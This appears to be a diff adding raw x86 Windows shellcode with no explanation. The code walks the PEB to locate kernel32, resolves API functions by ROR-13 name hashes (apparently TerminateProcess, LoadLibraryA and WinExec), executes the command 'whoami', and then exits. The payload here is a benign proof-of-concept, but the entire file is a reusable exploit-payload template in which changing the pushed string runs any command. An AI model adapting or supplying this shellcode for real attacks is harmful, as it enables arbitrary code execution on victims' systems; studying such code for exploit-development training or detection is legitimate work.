@@ -1,0 +1,110 @@
+
+start:
+mov ebp, esp               ;
+add esp, 0xfffff6A0        ;
+
+find_kernel32:
+xor ecx, ecx               ;
+mov esi, 
+fs:
+[ecx+30h]      ;
+mov esi, [esi+0Ch]         ;
+mov esi, [esi+1Ch]         ;
+
+next_module:
+mov ebx, [esi+8h]          ;
+mov edi, 0xffffffe0        ;
+neg edi                    ;
+add edi, esi               ;
+mov edi, [edi]             ;
+mov esi, [esi]             ;
+cmp [edi+12*2], cx         ;
+jne next_module            ;
+jmp push_eip               ;
+
+pop_eip:
+pop esi                    ;
+mov [ebp+0x04], esi        ;
+jmp find_funcs             ;
+
+push_eip:
+call pop_eip               ;
+
+find_function:
+pushad                     ;
+mov eax, [ebx+0x3c]        ;
+mov edi, [ebx+eax+0x78]    ;
+add edi, ebx               ;
+mov ecx, [edi+0x18]        ;
+mov edx, 0xffffffe0        ;
+neg edx                    ;
+add edx, edi               ;
+mov eax, [edx]             ;
+add eax, ebx               ;
+mov [ebp-4], eax           ;
+
+find_function_loop:
+jecxz end_func_loop        ;
+dec ecx                    ;
+mov eax, [ebp-4]           ;
+mov esi, [eax+ecx*4]       ;
+add esi, ebx               ;
+
+compute_hash:
+xor eax, eax               ;
+cdq                        ;
+cld                        ;
+
+compute_hash_l:
+lodsb                      ;
+test al, al                ;
+jz compute_hash_fin        ;
+ror edx, 0x0d              ;
+add edx, eax               ;
+jmp compute_hash_l         ;
+
+compute_hash_fin:
+
+find_function_cmp:
+cmp edx, [esp+0x24]        ;
+jnz find_function_loop     ;
+mov edx, [edi+0x24]        ;
+add edx, ebx               ;
+mov cx, [edx+2*ecx]        ;
+mov edx, [edi+0x1C]        ;
+add edx, ebx               ;
+mov eax, [edx+4*ecx]       ;
+add eax, ebx               ;
+mov [esp+0x1C], eax        ;
+
+end_func_loop:
+popad                      ;
+ret                        ;
+
+find_funcs:
+push 0x78b5b983            ;
+call dword ptr [ebp+0x04]  ;
+mov [ebp+0x08], eax        ;
+push 0xec0e4e8e            ;
+call dword ptr [ebp+0x04]  ;
+mov [ebp+0x0c], eax        ;
+push 0xe8afe98 ;
+call dword ptr [ebp+0x04]  ;
+mov [ebp+0x1c], eax        ;
+xor eax, eax               ;
+push eax                   ;
+xor eax, eax;
+mov ax, 0x696d;
+push eax;
+push 0x616f6877;
+mov eax, esp               ;
+xor edx, edx               ;
+push edx                   ;
+push eax                   ;
+call dword ptr [ebp+0x1c]  ;
+
+gracefully_exit:
+xor eax, eax               ;
+push eax                   ;
+push 0xffffffff            ;
+call dword ptr [ebp+0x08]  ;
